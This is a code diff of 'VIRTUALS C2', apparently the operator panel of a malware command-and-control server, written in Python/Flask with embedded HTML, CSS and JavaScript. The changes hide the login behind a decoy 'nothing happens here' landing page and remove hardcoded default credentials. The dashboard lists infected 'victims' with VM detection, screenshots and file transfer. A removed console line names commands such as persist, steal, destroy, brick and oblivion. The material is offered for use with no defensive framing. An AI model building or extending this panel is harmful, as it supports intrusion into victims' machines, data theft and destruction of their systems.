@@ -1,6 +1,6 @@
 """
-VIRTUALS C2 - BIGGER UI EDITION
-15% Bigger Elements · Space Background · All Features
+VIRTUALS C2 - LANDING PAGE EDITION
+Hello Nothing Happens Here · Hidden Login · Working Auth
 BY: YOUR STAR BESTIE
 """
 
@@ -200,7 +200,7 @@ def login_required(f):
     @wraps(f)
     def decorated(*args, **kwargs):
         if not session.get('logged_in'):
-            return redirect(url_for('landing'))
+            return redirect(url_for('login_page'))
         return f(*args, **kwargs)
     return decorated
 
@@ -211,40 +211,78 @@ LANDING_PAGE = '''
 <!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>VIRTUALS C2</title>
-<style>*{margin:0;padding:0;box-sizing:border-box}body{background:linear-gradient(135deg,#0a0a0f,#1a0a2e);color:#c8c8d0;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center}
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:linear-gradient(135deg,#0a0a0f,#1a0a2e);color:#c8c8d0;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;position:relative}
+.landing-container{text-align:center}
+.landing-container h1{color:#e8e8f0;font-size:72px;font-weight:100;letter-spacing:8px;opacity:0.6}
+.landing-container h1 span{color:#446688}
+.landing-container .sub{color:#555568;font-size:18px;margin-top:10px;letter-spacing:4px}
+.landing-container .sub .status{color:#44dd88}
+.question-mark{position:fixed;bottom:30px;right:30px;width:50px;height:50px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:24px;color:#666680;cursor:pointer;transition:0.3s;text-decoration:none;z-index:100}
+.question-mark:hover{background:rgba(255,255,255,0.1);border-color:rgba(255,255,255,0.15);color:#e8e8f0}
+</style>
+</head>
+<body>
+<div class="landing-container">
+<h1>◈ VIRTUALS <span>C2</span></h1>
+<div class="sub"><span class="status">●</span> HELLO NOTHING HAPPENS HERE</div>
+</div>
+<a href="/login" class="question-mark">?</a>
+</body>
+</html>
+'''
+
+# ============================================
+# HTML - LOGIN PAGE (NO AUTO-FILL)
+# ============================================
+LOGIN_PAGE = '''
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>VIRTUALS C2 - Login</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:linear-gradient(135deg,#0a0a0f,#1a0a2e);color:#c8c8d0;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center}
 .login-container{background:rgba(10,10,18,0.85);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:40px;width:400px;max-width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
-.login-container h1{color:#e8e8f0;font-size:32px;font-weight:300;text-align:center;letter-spacing:4px;margin-bottom:5px}
-.login-container h1 span{color:#446688}.login-container .sub{color:#666680;text-align:center;font-size:14px;margin-bottom:30px}.login-container .sub .status{color:#44dd88}
+.login-container h1{color:#e8e8f0;font-size:28px;font-weight:300;text-align:center;letter-spacing:4px;margin-bottom:5px}
+.login-container h1 span{color:#446688}
+.login-container .sub{color:#666680;text-align:center;font-size:13px;margin-bottom:30px}
+.login-container .sub .status{color:#44dd88}
 .login-container label{color:#8888a0;font-size:13px;display:block;margin-bottom:5px}
 .login-container input{width:100%;padding:14px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:8px;color:#e8e8f0;font-size:16px;outline:none;margin-bottom:15px;transition:0.3s}
 .login-container input:focus{border-color:rgba(68,170,255,0.4)}
+.login-container input::placeholder{color:#444458}
 .login-container button{width:100%;padding:14px;background:rgba(68,170,255,0.15);border:1px solid rgba(68,170,255,0.2);border-radius:8px;color:#88ccdd;font-size:17px;cursor:pointer;transition:0.3s;font-weight:600}
 .login-container button:hover{background:rgba(68,170,255,0.25)}
-.login-container .error{color:#cc8888;text-align:center;margin-top:10px;display:none}
+.login-container .error{color:#cc8888;text-align:center;margin-top:10px;display:none;font-size:14px}
+.login-container .back-link{text-align:center;margin-top:15px;font-size:12px;color:#555568}
+.login-container .back-link a{color:#666680;text-decoration:none;transition:0.3s}
+.login-container .back-link a:hover{color:#88aacc}
 </style>
 </head>
 <body>
 <div class="login-container">
 <h1>◈ VIRTUALS <span>C2</span></h1>
-<div class="sub">Control Panel <span class="status">● Online</span></div>
+<div class="sub"><span class="status">●</span> Control Panel Login</div>
 <form onsubmit="login(event)">
 <label>Username</label>
-<input type="text" id="username" value="admin" required>
+<input type="text" id="username" placeholder="Enter username" required>
 <label>Password</label>
-<input type="password" id="password" value="virtuals2024" required>
+<input type="password" id="password" placeholder="Enter password" required>
 <button type="submit">Access Panel</button>
 <div class="error" id="errorMsg">Invalid credentials</div>
 </form>
+<div class="back-link"><a href="/">← Back</a></div>
 </div>
 <script>
-function login(e){e.preventDefault();const u=document.getElementById('username').value;const p=document.getElementById('password').value;fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>r.json()).then(d=>{if(d.success){window.location.href='/dashboard';}else{document.getElementById('errorMsg').style.display='block';}});
+function login(e){e.preventDefault();const u=document.getElementById('username').value;const p=document.getElementById('password').value;fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>r.json()).then(d=>{if(d.success){window.location.href='/dashboard';}else{document.getElementById('errorMsg').style.display='block';}}).catch(()=>{document.getElementById('errorMsg').style.display='block';});}
 </script>
 </body>
 </html>
 '''
 
 # ============================================
-# HTML - DASHBOARD WITH BIGGER UI
+# HTML - DASHBOARD
 # ============================================
 DASHBOARD = '''
 <!DOCTYPE html>
@@ -252,128 +290,122 @@ DASHBOARD = '''
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>VIRTUALS C2</title>
+<title>VIRTUALS C2 - Dashboard</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:100vh;overflow:hidden;font-size:16px;position:relative}
-::-webkit-scrollbar{width:5px;height:5px}
+body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:100vh;overflow:hidden;font-size:15px;position:relative}
+::-webkit-scrollbar{width:4px;height:4px}
 ::-webkit-scrollbar-track{background:rgba(255,255,255,0.02)}
 ::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.12);border-radius:3px}
 ::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,0.25)}
-
 #space-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none;overflow:hidden;background:radial-gradient(ellipse at center,#0d0d1a 0%,#07070d 100%)}
 .star{position:absolute;background:white;border-radius:50%;opacity:0;animation:twinkle var(--duration) infinite}
 .star-layer-1{width:2px;height:2px}
 .star-layer-2{width:1.5px;height:1.5px}
 .star-layer-3{width:1px;height:1px}
 @keyframes twinkle{0%{opacity:0;transform:scale(0.5)}50%{opacity:0.8;transform:scale(1)}100%{opacity:0;transform:scale(0.5)}}
-
 .glass{background:rgba(10,10,18,0.85);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.06);border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.3);position:relative;z-index:1}
-.header{background:rgba(10,10,18,0.92);backdrop-filter:blur(12px);padding:10px 18px;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;justify-content:space-between;align-items:center;height:48px;flex-shrink:0;z-index:10;position:relative}
-.header h1{color:#e8e8f0;font-size:20px;font-weight:300;letter-spacing:3px}
+.header{background:rgba(10,10,18,0.92);backdrop-filter:blur(12px);padding:8px 16px;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;justify-content:space-between;align-items:center;height:46px;flex-shrink:0;z-index:10;position:relative}
+.header h1{color:#e8e8f0;font-size:18px;font-weight:300;letter-spacing:3px}
 .header h1 span{color:#446688}
-.header .stats{display:flex;gap:16px;align-items:center}
-.header .stats .stat-item{color:#8888a0;font-size:13px}
-.header .stats .stat-item .num{color:#e8e8f0;font-weight:600;font-size:17px;margin-left:3px}
-.header .logout-btn{background:rgba(200,60,60,0.12);color:#cc8888;border:1px solid rgba(200,60,60,0.15);padding:4px 14px;border-radius:4px;cursor:pointer;font-size:13px;transition:0.2s}
+.header .stats{display:flex;gap:14px;align-items:center}
+.header .stats .stat-item{color:#8888a0;font-size:12px}
+.header .stats .stat-item .num{color:#e8e8f0;font-weight:600;font-size:16px;margin-left:3px}
+.header .logout-btn{background:rgba(200,60,60,0.12);color:#cc8888;border:1px solid rgba(200,60,60,0.15);padding:4px 14px;border-radius:4px;cursor:pointer;font-size:12px;transition:0.2s}
 .header .logout-btn:hover{background:rgba(200,60,60,0.2)}
-.notification-bell{position:relative;cursor:pointer;font-size:18px;color:#8888a0;transition:0.2s;margin-right:6px}
+.notification-bell{position:relative;cursor:pointer;font-size:17px;color:#8888a0;transition:0.2s;margin-right:6px}
 .notification-bell:hover{color:#e8e8f0}
-.notification-bell .badge{position:absolute;top:-6px;right:-6px;background:#ff4444;color:#fff;font-size:9px;padding:1px 5px;border-radius:8px;min-width:16px;text-align:center}
-.notification-dropdown{position:absolute;top:40px;right:0;width:300px;max-height:280px;background:rgba(10,10,18,0.95);backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:8px;overflow-y:auto;display:none;z-index:1000;box-shadow:0 10px 40px rgba(0,0,0,0.5)}
-.notification-dropdown .notif-item{padding:6px 10px;border-bottom:1px solid rgba(255,255,255,0.03);border-radius:4px}
+.notification-bell .badge{position:absolute;top:-6px;right:-6px;background:#ff4444;color:#fff;font-size:8px;padding:1px 5px;border-radius:8px;min-width:15px;text-align:center}
+.notification-dropdown{position:absolute;top:38px;right:0;width:280px;max-height:260px;background:rgba(10,10,18,0.95);backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:6px;overflow-y:auto;display:none;z-index:1000;box-shadow:0 10px 40px rgba(0,0,0,0.5)}
+.notification-dropdown .notif-item{padding:5px 8px;border-bottom:1px solid rgba(255,255,255,0.03);border-radius:4px}
 .notification-dropdown .notif-item:hover{background:rgba(255,255,255,0.03)}
-.notification-dropdown .notif-item .notif-title{color:#88aacc;font-size:13px;font-weight:500}
-.notification-dropdown .notif-item .notif-content{color:#8888a0;font-size:12px;margin-top:1px}
-.notification-dropdown .notif-item .notif-time{color:#555568;font-size:10px;margin-top:1px}
-.container{display:flex;height:calc(100vh - 48px);padding:6px;gap:6px;position:relative;z-index:1}
-.channels-panel{width:180px;min-width:180px;display:flex;flex-direction:column;gap:4px;height:100%}
-.channels-panel .panel-title{color:#666680;font-size:10px;text-transform:uppercase;letter-spacing:2px;padding:6px 10px;border-bottom:1px solid rgba(255,255,255,0.04);flex-shrink:0}
-.channel-list{flex:1;overflow-y:auto;padding:4px}
-.channel-item{display:flex;align-items:center;padding:5px 10px;margin:2px 0;border-radius:4px;cursor:pointer;transition:0.15s;border-left:2px solid transparent}
+.notification-dropdown .notif-item .notif-title{color:#88aacc;font-size:12px;font-weight:500}
+.notification-dropdown .notif-item .notif-content{color:#8888a0;font-size:11px;margin-top:1px}
+.notification-dropdown .notif-item .notif-time{color:#555568;font-size:9px;margin-top:1px}
+.container{display:flex;height:calc(100vh - 46px);padding:5px;gap:5px;position:relative;z-index:1}
+.channels-panel{width:170px;min-width:170px;display:flex;flex-direction:column;gap:4px;height:100%}
+.channels-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;padding:5px 8px;border-bottom:1px solid rgba(255,255,255,0.04);flex-shrink:0}
+.channel-list{flex:1;overflow-y:auto;padding:3px}
+.channel-item{display:flex;align-items:center;padding:4px 8px;margin:1px 0;border-radius:4px;cursor:pointer;transition:0.15s;border-left:2px solid transparent}
 .channel-item:hover{background:rgba(255,255,255,0.04)}
 .channel-item.active{background:rgba(68,170,255,0.08);border-left-color:#44aaff}
-.channel-item .status-dot{width:7px;height:7px;border-radius:50%;margin-right:7px;flex-shrink:0}
+.channel-item .status-dot{width:6px;height:6px;border-radius:50%;margin-right:6px;flex-shrink:0}
 .channel-item .status-dot.online{background:#44dd88;animation:pulse 2s infinite}
 .channel-item .status-dot.offline{background:#664444}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
-.channel-item .name{color:#e8e8f0;font-size:13px;flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.channel-item .badge{background:rgba(200,60,60,0.12);color:#cc8888;font-size:8px;padding:0 6px;border-radius:6px;line-height:14px;height:14px;flex-shrink:0;margin-left:4px}
-.channel-item .activity{color:#666680;font-size:9px;margin-left:4px;font-style:italic;flex-shrink:0}
+.channel-item .name{color:#e8e8f0;font-size:12px;flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.channel-item .badge{background:rgba(200,60,60,0.12);color:#cc8888;font-size:7px;padding:0 5px;border-radius:6px;line-height:13px;height:13px;flex-shrink:0;margin-left:4px}
+.channel-item .activity{color:#666680;font-size:8px;margin-left:4px;font-style:italic;flex-shrink:0}
 .middle-panel{flex:1;display:flex;flex-direction:column;gap:5px;min-width:200px;height:100%}
-.chat-panel{padding:8px 12px;flex:1;display:flex;flex-direction:column;min-height:0}
-.chat-panel .panel-title{color:#666680;font-size:10px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:4px;margin-bottom:5px;flex-shrink:0;display:flex;justify-content:space-between;align-items:center}
+.chat-panel{padding:6px 10px;flex:1;display:flex;flex-direction:column;min-height:0}
+.chat-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:3px;margin-bottom:4px;flex-shrink:0;display:flex;justify-content:space-between;align-items:center}
 .chat-panel .panel-title .channel-name{color:#88aacc;font-weight:500}
-.chat-messages{background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:5px;padding:6px 10px;flex:1;overflow-y:auto;min-height:120px;font-size:14px;line-height:1.7}
-.chat-messages .msg{padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.02)}
-.chat-messages .time{color:#555568;margin-right:5px;font-size:11px}
-.chat-messages .sender{font-weight:600;font-size:14px}
+.chat-messages{background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:5px;padding:5px 8px;flex:1;overflow-y:auto;min-height:100px;font-size:13px;line-height:1.6}
+.chat-messages .msg{padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02)}
+.chat-messages .time{color:#555568;margin-right:4px;font-size:10px}
+.chat-messages .sender{font-weight:600;font-size:13px}
 .chat-messages .sender.us{color:#66ddbb}
 .chat-messages .sender.victim{color:#ddbb88}
 .chat-messages .sender.system{color:#8888aa}
 .chat-messages .sender.embed{color:#ffd700}
-.chat-input-area{display:flex;gap:5px;margin-top:5px;flex-shrink:0}
-.chat-input-area input{flex:1;padding:6px 12px;background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.05);border-radius:4px;color:#c8c8d0;font-family:inherit;font-size:15px;outline:none;min-height:36px}
+.chat-input-area{display:flex;gap:4px;margin-top:4px;flex-shrink:0}
+.chat-input-area input{flex:1;padding:5px 10px;background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.05);border-radius:4px;color:#c8c8d0;font-family:inherit;font-size:13px;outline:none;min-height:30px}
 .chat-input-area input:focus{border-color:rgba(255,255,255,0.12)}
-.chat-input-area input::placeholder{color:#444458;font-size:13px}
-.chat-input-area button{padding:6px 18px;background:rgba(255,255,255,0.04);color:#b0b0c0;border:1px solid rgba(255,255,255,0.06);border-radius:4px;cursor:pointer;font-family:inherit;font-size:14px;transition:0.15s}
+.chat-input-area input::placeholder{color:#444458;font-size:11px}
+.chat-input-area button{padding:5px 14px;background:rgba(255,255,255,0.04);color:#b0b0c0;border:1px solid rgba(255,255,255,0.06);border-radius:4px;cursor:pointer;font-family:inherit;font-size:12px;transition:0.15s}
 .chat-input-area button:hover{background:rgba(255,255,255,0.08);color:#e8e8f0}
-.file-upload-area{display:flex;gap:5px;margin-top:4px;flex-shrink:0;flex-wrap:wrap;align-items:center}
-.file-upload-area input[type="file"]{flex:1;padding:4px 10px;background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:4px;color:#c8c8d0;font-size:13px;min-width:60px}
-.file-upload-area button{padding:4px 14px;background:rgba(50,180,200,0.1);color:#88ccdd;border:1px solid rgba(50,180,200,0.15);border-radius:4px;cursor:pointer;font-size:13px;transition:0.15s}
+.file-upload-area{display:flex;gap:4px;margin-top:3px;flex-shrink:0;flex-wrap:wrap;align-items:center}
+.file-upload-area input[type="file"]{flex:1;padding:2px 6px;background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:4px;color:#c8c8d0;font-size:11px;min-width:40px}
+.file-upload-area button{padding:2px 10px;background:rgba(50,180,200,0.1);color:#88ccdd;border:1px solid rgba(50,180,200,0.15);border-radius:4px;cursor:pointer;font-size:11px;transition:0.15s}
 .file-upload-area button:hover{background:rgba(50,180,200,0.18)}
-.file-upload-area #fileName{color:#555568;font-size:12px;max-width:80px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.upload-progress{width:100%;height:3px;background:rgba(255,255,255,0.04);border-radius:1px;margin-top:2px;overflow:hidden;display:none}
+.file-upload-area #fileName{color:#555568;font-size:10px;max-width:60px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.upload-progress{width:100%;height:2px;background:rgba(255,255,255,0.04);border-radius:1px;margin-top:2px;overflow:hidden;display:none}
 .upload-progress .bar{height:100%;background:linear-gradient(90deg,#44dd88,#88ccdd);width:0%;transition:width 0.3s}
-.download-section{display:flex;gap:6px;margin-top:4px;flex-shrink:0;flex-wrap:wrap}
-.download-section button{background:rgba(50,180,120,0.12);color:#66ddbb;border:1px solid rgba(50,180,120,0.15);padding:4px 14px;border-radius:4px;cursor:pointer;font-size:13px;transition:0.15s}
+.download-section{display:flex;gap:5px;margin-top:3px;flex-shrink:0;flex-wrap:wrap}
+.download-section button{background:rgba(50,180,120,0.12);color:#66ddbb;border:1px solid rgba(50,180,120,0.15);padding:3px 10px;border-radius:4px;cursor:pointer;font-size:11px;transition:0.15s}
 .download-section button:hover{background:rgba(50,180,120,0.2)}
 .download-section .zip-btn{background:rgba(50,180,200,0.12);color:#88ccdd;border:1px solid rgba(50,180,200,0.15)}
 .download-section .zip-btn:hover{background:rgba(50,180,200,0.2)}
-.right-panel{width:260px;min-width:200px;display:flex;flex-direction:column;gap:5px;height:100%}
-.details-panel{padding:8px 12px;height:50%;overflow-y:auto;flex-shrink:0}
-.details-panel .panel-title{color:#666680;font-size:10px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:4px;margin-bottom:5px}
-.detail-item{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:13px;display:flex;justify-content:space-between}
+.right-panel{width:240px;min-width:200px;display:flex;flex-direction:column;gap:5px;height:100%}
+.details-panel{padding:6px 10px;height:50%;overflow-y:auto;flex-shrink:0}
+.details-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:3px;margin-bottom:4px}
+.detail-item{padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:12px;display:flex;justify-content:space-between}
 .detail-item .label{color:#555568}
 .detail-item .value{color:#e8e8f0;font-weight:500}
 .detail-item .value.online{color:#66dd88}
 .detail-item .value.offline{color:#886666}
-.screenshot-gallery{display:flex;flex-wrap:wrap;gap:4px;margin-top:4px}
-.screenshot-thumb{width:48px;height:34px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:3px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:9px;color:#555568;transition:0.15s}
+.screenshot-gallery{display:flex;flex-wrap:wrap;gap:3px;margin-top:3px}
+.screenshot-thumb{width:42px;height:30px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:3px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:8px;color:#555568;transition:0.15s}
 .screenshot-thumb:hover{border-color:rgba(255,255,255,0.12)}
-.logs-panel{padding:8px 12px;flex:1;overflow-y:auto;min-height:0}
-.logs-panel .panel-title{color:#666680;font-size:10px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:4px;margin-bottom:4px}
-.log-item{padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:12px;display:flex;gap:4px;opacity:0.9}
-.log-item .type{padding:0 4px;border-radius:2px;font-size:7px;text-transform:uppercase;flex-shrink:0;font-weight:600;margin-top:1px}
+.logs-panel{padding:6px 10px;flex:1;overflow-y:auto;min-height:0}
+.logs-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:3px;margin-bottom:3px}
+.log-item{padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:10px;display:flex;gap:3px;opacity:0.9}
+.log-item .type{padding:0 3px;border-radius:2px;font-size:6px;text-transform:uppercase;flex-shrink:0;font-weight:600;margin-top:1px}
 .log-item .type.success{background:rgba(50,180,120,0.2);color:#66ddbb}
 .log-item .type.failed{background:rgba(180,50,50,0.2);color:#cc8888}
 .log-item .type.info{background:rgba(68,170,255,0.12);color:#44aaff}
 .log-item .type.system{background:rgba(136,136,170,0.12);color:#8888aa}
-.log-item .log-time{color:#444458;font-size:9px;flex-shrink:0}
-.log-item .log-content{color:#b0b0c0;font-size:11px}
-.embed-box{background:rgba(0,0,0,0.2);border-left:3px solid var(--embed-color,#44aaff);border-radius:3px;padding:5px 8px;margin:3px 0}
-.embed-box .embed-title{font-size:14px;font-weight:600;color:#e8e8f0}
-.embed-box .embed-content{font-size:13px;color:#b0b0c0;white-space:pre-wrap;margin-top:1px}
-.embed-box .embed-footer{font-size:10px;color:#555568;margin-top:1px}
-/* Command help embed */
-.command-help{background:rgba(0,0,0,0.2);border-left:3px solid #446688;border-radius:3px;padding:5px 8px;margin:3px 0}
-.command-help .cmd-title{font-size:13px;font-weight:600;color:#88aacc}
-.command-help .cmd-desc{font-size:12px;color:#8888a0;margin-top:1px}
-@media(max-width:1024px){.channels-panel{width:150px;min-width:150px}.right-panel{width:210px;min-width:170px}}
-@media(max-width:768px){.container{flex-direction:column}.channels-panel{width:100%;min-width:100%;height:auto;max-height:90px}.channel-list{display:flex;flex-wrap:wrap;gap:3px;padding:4px}.channel-item{min-width:80px}.right-panel{width:100%;min-width:100%;flex-direction:row}.details-panel{height:auto;max-height:160px;width:50%}.logs-panel{height:auto;max-height:160px;width:50%}}
+.log-item .log-time{color:#444458;font-size:8px;flex-shrink:0}
+.log-item .log-content{color:#b0b0c0;font-size:10px}
+.embed-box{background:rgba(0,0,0,0.2);border-left:3px solid var(--embed-color,#44aaff);border-radius:3px;padding:4px 6px;margin:2px 0}
+.embed-box .embed-title{font-size:13px;font-weight:600;color:#e8e8f0}
+.embed-box .embed-content{font-size:12px;color:#b0b0c0;white-space:pre-wrap;margin-top:1px}
+.embed-box .embed-footer{font-size:9px;color:#555568;margin-top:1px}
+@media(max-width:1024px){.channels-panel{width:140px;min-width:140px}.right-panel{width:200px;min-width:160px}}
+@media(max-width:768px){.container{flex-direction:column}.channels-panel{width:100%;min-width:100%;height:auto;max-height:80px}.channel-list{display:flex;flex-wrap:wrap;gap:3px;padding:3px}.channel-item{min-width:70px}.right-panel{width:100%;min-width:100%;flex-direction:row}.details-panel{height:auto;max-height:150px;width:50%}.logs-panel{height:auto;max-height:150px;width:50%}}
 </style>
 </head>
 <body>
 <div id="space-bg"></div>
 <div class="header">
 <h1>◈ VIRTUALS <span>C2</span></h1>
-<div style="display:flex;align-items:center;gap:10px;">
+<div style="display:flex;align-items:center;gap:8px;">
 <div class="notification-bell" onclick="toggleNotifications()" id="bellBtn">
 🔔
 <span class="badge" id="notifBadge" style="display:none;">0</span>
 <div class="notification-dropdown" id="notifDropdown">
-<div style="color:#666680;font-size:11px;padding:4px 8px;border-bottom:1px solid rgba(255,255,255,0.04);">Notifications</div>
-<div id="notifList"><div style="color:#555568;font-size:12px;padding:8px;text-align:center;">No notifications</div></div>
+<div style="color:#666680;font-size:10px;padding:4px 8px;border-bottom:1px solid rgba(255,255,255,0.04);">Notifications</div>
+<div id="notifList"><div style="color:#555568;font-size:11px;padding:8px;text-align:center;">No notifications</div></div>
 </div>
 </div>
 <div class="stats">
@@ -388,16 +420,13 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 <div class="channels-panel glass">
 <div class="panel-title">CHANNELS</div>
 <div class="channel-list" id="channelList">
-<div style="color:#555568;font-size:13px;text-align:center;padding:15px;">No channels</div>
+<div style="color:#555568;font-size:12px;text-align:center;padding:12px;">No channels</div>
 </div>
 </div>
 <div class="middle-panel">
 <div class="chat-panel glass">
 <div class="panel-title">CONSOLE <span class="channel-name" id="currentChannel">#general</span></div>
-<div class="chat-messages" id="chatMessages">
-<div class="msg"><span class="time">[system]</span><span class="sender system">virtuals</span> ready</div>
-<div class="msg"><span class="time">[system]</span><span class="sender system">virtuals</span> commands: whois, screenshot, flash, scan, persist, steal, upload, download, destroy, brick, vmcheck, oblivion</div>
-</div>
+<div class="chat-messages" id="chatMessages"><div class="msg"><span class="time">[system]</span><span class="sender system">virtuals</span> ready</div></div>
 <div class="chat-input-area"><input id="chatInput" placeholder="/command or message" onkeypress="if(event.key==='Enter')sendMessage()"><button onclick="sendMessage()">send</button></div>
 <div class="file-upload-area">
 <input type="file" id="fileInput" onchange="document.getElementById('fileName').textContent=this.files[0]?this.files[0].name:'no file'">
@@ -414,36 +443,32 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 <div class="right-panel">
 <div class="details-panel glass">
 <div class="panel-title">DETAILS</div>
-<div id="victimDetails"><div style="color:#555568;font-size:13px;text-align:center;padding:12px;">Select a channel</div></div>
+<div id="victimDetails"><div style="color:#555568;font-size:12px;text-align:center;padding:10px;">Select a channel</div></div>
 <div style="margin-top:4px;border-top:1px solid rgba(255,255,255,0.04);padding-top:4px;">
-<div style="color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:1px;">Screenshots</div>
-<div class="screenshot-gallery" id="screenshotGallery"><div style="color:#555568;font-size:11px;">none</div></div>
+<div style="color:#666680;font-size:8px;text-transform:uppercase;letter-spacing:1px;">Screenshots</div>
+<div class="screenshot-gallery" id="screenshotGallery"><div style="color:#555568;font-size:10px;">none</div></div>
 </div>
 </div>
 <div class="logs-panel glass">
 <div class="panel-title">LOGS</div>
-<div id="logOutput"><div style="color:#555568;font-size:12px;">no logs</div></div>
+<div id="logOutput"><div style="color:#555568;font-size:11px;">no logs</div></div>
 </div>
 </div>
 </div>
 <script>
-// Generate stars
 (function(){const c=document.getElementById('space-bg');for(let i=0;i<350;i++){const s=document.createElement('div');const r=Math.random();s.className='star '+(r<0.33?'star-layer-1':r<0.66?'star-layer-2':'star-layer-3');s.style.left=Math.random()*100+'%';s.style.top=Math.random()*100+'%';s.style.setProperty('--duration',(3+Math.random()*5)+'s');s.style.animationDelay=(Math.random()*5)+'s';s.style.opacity=0.2+Math.random()*0.6;c.appendChild(s);}})();
-
-// APP STATE
 let state={channels:{},activeChannel:'general',commands:{},cmdCount:0,notifications:[]};
-
 function logout(){fetch('/api/logout',{method:'POST'}).then(()=>window.location.href='/');}
 function api(a,d,c){fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:a,...d})}).then(r=>r.json()).then(c).catch(()=>{});}
 function refresh(){api('getVictims',{},d=>{if(d.success){state.channels=d.victims;renderChannels();updateStats();}});}
-function renderChannels(){const el=document.getElementById('channelList');const v=Object.values(state.channels);if(v.length===0){el.innerHTML='<div style="color:#555568;font-size:13px;text-align:center;padding:15px;">No channels</div>';return;}el.innerHTML=v.map(v=>`<div class="channel-item ${state.activeChannel===v.id?'active':''}" onclick="selectChannel('${v.id}')"><span class="status-dot ${v.status==='Online'?'online':'offline'}"></span><span class="name">${v.id}</span>${v.is_vm?'<span class="badge">VM</span>':''}<span class="activity">${v.activity||'idle'}</span></div>`).join('');}
+function renderChannels(){const el=document.getElementById('channelList');const v=Object.values(state.channels);if(v.length===0){el.innerHTML='<div style="color:#555568;font-size:12px;text-align:center;padding:12px;">No channels</div>';return;}el.innerHTML=v.map(v=>`<div class="channel-item ${state.activeChannel===v.id?'active':''}" onclick="selectChannel('${v.id}')"><span class="status-dot ${v.status==='Online'?'online':'offline'}"></span><span class="name">${v.id}</span>${v.is_vm?'<span class="badge">VM</span>':''}<span class="activity">${v.activity||'idle'}</span></div>`).join('');}
 function selectChannel(id){state.activeChannel=id;document.getElementById('currentChannel').textContent='#'+id;renderChannels();showDetails(id);loadScreenshots(id);}
